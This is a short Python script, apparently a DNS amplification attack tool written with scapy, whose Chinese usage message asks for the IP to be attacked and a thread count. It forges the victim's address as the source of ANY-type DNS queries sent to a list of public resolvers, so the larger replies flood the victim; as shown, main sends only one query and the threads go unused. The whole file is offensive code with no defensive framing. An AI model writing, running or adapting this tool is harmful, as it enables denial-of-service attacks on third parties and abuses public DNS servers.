#!/usr/bin/env python 
# -*- coding:utf-8 -*-

from scapy.all import *
import os
import sys
import threading

if len(sys.argv) !=3:
    print("请输入正确的格式!")
    print("正确的格式为：被攻击ip  线程数")
    sys.exit()

target=str(sys.argv[1])
threads=int(sys.argv[2])
dns_list=['119.29.29.29','223.5.5.5','114.114.114.114','180.76.76.76','123.125.81.6','1.2.4.8','117.50.11.11','8.8.8.8','1.1.1.1']

def dnsattack(dns):
    i=IP(dst=dns,src=target)
    u=UDP(dport=53)
    d=DNS(rd=1,qdcount=1)
    d.qd=DNSQR(qname="baidu.com",qtype=255)
    r=(i/u/d)
    res=sr1(r)
    print(res)

def main():
    dns="114.114.114.114"
    dnsattack(dns)

if __name__ == '__main__':
    main()